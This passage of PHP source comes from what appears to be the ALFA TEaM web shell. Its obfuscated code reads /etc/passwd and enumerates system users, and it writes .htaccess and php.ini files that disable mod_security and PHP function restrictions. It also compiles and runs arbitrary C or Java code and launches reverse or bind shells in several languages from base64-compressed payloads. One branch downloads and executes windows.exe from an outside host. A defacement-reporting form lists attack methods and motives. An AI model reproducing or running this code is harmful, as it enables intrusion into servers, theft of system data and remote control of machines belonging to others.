echo trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee[1]).'<br>';}}}
if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
echo __pre();
if(_alfa_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
for($uwdmfmmt9871d3a2c554b27151cacf1422eec048=0;$uwdmfmmt9871d3a2c554b27151cacf1422eec048<60000;$uwdmfmmt9871d3a2c554b27151cacf1422eec048++){
$ltylgdel636bfa0fb2716ff876f5e33854cc9648 = @posix_getpwuid($uwdmfmmt9871d3a2c554b27151cacf1422eec048);
if(!empty($ltylgdel636bfa0fb2716ff876f5e33854cc9648)){
while(list ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf) = each($ltylgdel636bfa0fb2716ff876f5e33854cc9648)){
echo "$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf:";
}echo "\n";}}
}else{__alert('failed...');}}
if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
}
if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(ALFA TEaM)");
echo '<center><b><big> php.ini created...!</center></b></big>';
}
if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
}
echo "<br></div>";
alfafooter();
}
function __get_resource($mveevork9a0364b9e99bb480dd25e1f0284c8555){
return @gzinflate(__ZGVjb2Rlcg($mveevork9a0364b9e99bb480dd25e1f0284c8555));
}
function __write_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $mveevork9a0364b9e99bb480dd25e1f0284c8555){
if($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62 = @fopen($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, "wb")){
if(fwrite($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, $mveevork9a0364b9e99bb480dd25e1f0284c8555)!==false) return true;
}
return false;
}
function bcinit($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11, $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c, $rvldmxgwf5b0c5d53a726b399ac97f64ef84054a){
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = "<font color='green'>[ Success...! ]</font>";
$xvngexov56bd7107802ebe56c6918992f0608ec6 = "<font color='red'>[ Failed...! ]</font>";
if($lbzvzoec05e72357fd60ba5e66d87abf6947ec4c!="") $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c = $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c." ";
if($rvldmxgwf5b0c5d53a726b399ac97f64ef84054a!="") $rvldmxgwf5b0c5d53a726b399ac97f64ef84054a = " ".$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
if($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311=="c"){
$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
chdir($qofyaewi3f70a5cb5712430a7869904d10f14c87);
if(is_writable($qofyaewi3f70a5cb5712430a7869904d10f14c87)){
$tednfjezceb6b355c65c1ee318991aead0f652e4 = substr(md5(time()),0,8);
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311.$tednfjezceb6b355c65c1ee318991aead0f652e4.".c";
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $ydojshxa435ed7e9f07f740abf511a62c00eef6e;
if(__write_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11)){
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = ($GLOBALS['sys']=='win')? ".exe":".out";
$tmqejnqb223e432bb7645153883f42259bd6a8fa = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.$uzehrcsaabf77184f55403d75b9d51d79162a7ca;
$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c = "-o ".$tmqejnqb223e432bb7645153883f42259bd6a8fa." ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c;
$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "gcc ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
if(is_file($tmqejnqb223e432bb7645153883f42259bd6a8fa)){
if(chmod($tmqejnqb223e432bb7645153883f42259bd6a8fa, 0755)){
$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = $tmqejnqb223e432bb7645153883f42259bd6a8fa.$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
unlink($tmqejnqb223e432bb7645153883f42259bd6a8fa);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
unlink($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
}
return $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
}elseif($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311=="java"){
$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
chdir($qofyaewi3f70a5cb5712430a7869904d10f14c87);
if(is_writable($qofyaewi3f70a5cb5712430a7869904d10f14c87)){
if(preg_match("/class\ ([^{]+){/i",$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11, $yxarqqmp4b43b0aee35624cd95b910189b3dc231)){
$jnanqshy26b2a720f7b8c9bd8d3999c52da409d0 = trim($yxarqqmp4b43b0aee35624cd95b910189b3dc231[1]);
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $jnanqshy26b2a720f7b8c9bd8d3999c52da409d0;
}else{
$tednfjezceb6b355c65c1ee318991aead0f652e4 = substr(md5(time()),0,8);
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311.$tednfjezceb6b355c65c1ee318991aead0f652e4;
$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11 = "class ".$ydojshxa435ed7e9f07f740abf511a62c00eef6e." { ".$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11 . " } ";
}
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.".java";
if(__write_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11)){
$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "javac ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
$tmqejnqb223e432bb7645153883f42259bd6a8fa = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.".class";
if(is_file($tmqejnqb223e432bb7645153883f42259bd6a8fa)){
if(chmod($tmqejnqb223e432bb7645153883f42259bd6a8fa, 0755)){
$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "java ".$ydojshxa435ed7e9f07f740abf511a62c00eef6e.$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
unlink($tmqejnqb223e432bb7645153883f42259bd6a8fa);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
unlink($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
}
return $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
}
return false;
}
function alfaconnect(){
alfahead();
$trgmvmvce1bfd762321e409cee4ac0b6e841963c="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
$zetxriyy23eeeb4347bdd26bfc6b7ee9a3b755dd="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
$exelepbo58e53d1324eef6265fdb97b08ed9aadf="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$hupyxoxz36c4536996ca5615dcf9911f068786dc="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
$yyphbkaj4a8a08f09d37b73795649038408b5f33="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
$wcfvvmhi93f725a07423fe1c889f448b33d21f46="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
$lbpnyhzh763d8fdadcdd9153dea0f47649283e55 = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
foreach($lbpnyhzh763d8fdadcdd9153dea0f47649283e55 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){echo("<option value='{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}' ".($GLOBALS['sys']=='win'?'selected':'').">{$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf}</option>");}
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_POST['alfa1'];
$jywhuplv957b527bcfbad2e80f58d20683931435 = $_POST['alfa2'];
$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $_POST['alfa3'];
$mcpievhm61dd86c2dc75c3f569ec619bd283a33f = ($_POST['alfa4']=='bind'?$fbwqabyz901555fb06e346cb065ceb9808dcfc25:$fbwqabyz901555fb06e346cb065ceb9808dcfc25.' '.$jywhuplv957b527bcfbad2e80f58d20683931435);
$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $qofyaewi3f70a5cb5712430a7869904d10f14c87.'/'.$phbpyamz7572559ca86e781ba8fe8073a0b725c6.uniqid().rand(1,99999);
$anwigqkkb394126a0e52e75f1e3d535d0fb0d33c = array('perl','ruby','python','node');
eval('$lan=$'.$phbpyamz7572559ca86e781ba8fe8073a0b725c6.';');
if(in_array($phbpyamz7572559ca86e781ba8fe8073a0b725c6,$anwigqkkb394126a0e52e75f1e3d535d0fb0d33c)){
if(__write_file($kkkpgnftb068931cc450442b63f5b3d276ea4297,__get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63))){
if(_alfa_can_runCommand(true,true)){
$vyggorindd302f94682dbd2a114d63b0433602e0 = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx("$phbpyamz7572559ca86e781ba8fe8073a0b725c6 $kkkpgnftb068931cc450442b63f5b3d276ea4297 $mcpievhm61dd86c2dc75c3f569ec619bd283a33f $vyggorindd302f94682dbd2a114d63b0433602e0");
if($vemvtkqkc68271a63ddbc431c307beb7d2918275==''){$vemvtkqkc68271a63ddbc431c307beb7d2918275="<font color='green'><center>[ Finished...! ]</center></font>";}
echo("<pre class='ml1' style='margin-top:5px'>{$vemvtkqkc68271a63ddbc431c307beb7d2918275}</pre>");
}
}else{
echo("<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>");
}
}
if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='java'||$phbpyamz7572559ca86e781ba8fe8073a0b725c6=='c'){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = __get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63);
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = nl2br(bcinit($phbpyamz7572559ca86e781ba8fe8073a0b725c6, $nndigmblc13367945d5d4c91047b3b50234aa7ab,'',''));
echo("<pre class=ml1 style='margin-top:5px'><center>{$vemvtkqkc68271a63ddbc431c307beb7d2918275}</center></pre>");
}
if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='bcwin'){
$rpatbarj56aed7e7485ff03d5605b885b86e947e = new AlfaCURL();
$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = $rpatbarj56aed7e7485ff03d5605b885b86e947e->Send('http://solevisible.com/bc/windows.exe');
$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @fopen($qofyaewi3f70a5cb5712430a7869904d10f14c87.'/bcwin.exe','w+');
@fwrite($npviloqa8fa14cdd754f91cc6554c9e71929cce7, $fwekvgvg03c7c0ace395d80182db07ae2c30f034);
@fclose($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx($qofyaewi3f70a5cb5712430a7869904d10f14c87."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
}
if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$nndigmblc13367945d5d4c91047b3b50234aa7ab = __get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63);
if($nndigmblc13367945d5d4c91047b3b50234aa7ab!==false){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "\$target = \"".$mcpievhm61dd86c2dc75c3f569ec619bd283a33f."\";\n".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
eval($nndigmblc13367945d5d4c91047b3b50234aa7ab);
echo("<center><font color='green'>[ Finished...! ]</font></center>");
}
echo "</pre>";
}
}
echo "</div>";
alfafooter();
}
function alfazoneh(){
alfahead();
echo '<div class=header>';
if(!function_exists('curl_version')){
echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
}
$ajlrrcol15c454a15fd2f01687de2e56b824a6fe = array('known vulnerability (i.e. unpatched system)','undisclosed (new) vulnerability','configuration / admin. mistake','brute force attack','social engineering','Web Server intrusion','Web Server external module intrusion','Mail Server intrusion','FTP Server intrusion','SSH Server intrusion','Telnet Server intrusion','RPC Server intrusion','Shares misconfiguration','Other Server intrusion','SQL Injection','URL Poisoning','File Inclusion','Other Web Application bug','Remote administrative panel access bruteforcing','Remote administrative panel access password guessing','Remote administrative panel access social engineering','Attack against administrator(password stealing/sniffing)','Access credentials through Man In the Middle attack','Remote service password guessing','Remote service password bruteforce','Rerouting after attacking the Firewall','Rerouting after attacking the Router','DNS attack through social engineering','DNS attack through cache poisoning','Not available','Cross-Site Scripting');
$hwghecau40bea8d637cdf2c1b07fcf0630482b73 = array('Heh...just for fun!','Revenge against that website','Political reasons','As a challenge','I just want to be the best defacer','Patriotism','Not available');
echo '
<center><br><div class="txtfont_header">| Zone-h Mass Poster |</div><center><br>
<form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,\'>>\'); return false;">
<input type="text" name="defacer" size="67" id="text" placeholder="ALFA TEaM 2012" />
<br>
<select id="text" name="hackmode" style="width:400px;">';
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=1;
foreach($ajlrrcol15c454a15fd2f01687de2e56b824a6fe as $porcbkyw15d61712450a686a7f365adf4fef581f){echo('<option style="background-color: rgb(F, F, F);" value="'.$fyyftmba9dd4e461268c8034f5c8564e155c67a6.'">'.$porcbkyw15d61712450a686a7f365adf4fef581f.'</option>');$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;}
echo '</select><br><select id="text" name="reason" style="width:200px;">';
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=1;
foreach($hwghecau40bea8d637cdf2c1b07fcf0630482b73 as $porcbkyw15d61712450a686a7f365adf4fef581f){echo('<option style="background-color: rgb(F, F, F);" value="'.$fyyftmba9dd4e461268c8034f5c8564e155c67a6.'">'.$porcbkyw15d61712450a686a7f365adf4fef581f.'</option>');$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;}
echo '</select><br>
<textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
<p><input type="submit" value=" " name="go" /></p>
</form></center>';
if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
ob_start();
$tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03 = $_POST['alfa1'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa2'];
$letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa = $_POST['alfa3'];
$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = $_POST['alfa4'];
if(empty($tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03)){
die (__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}elseif($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
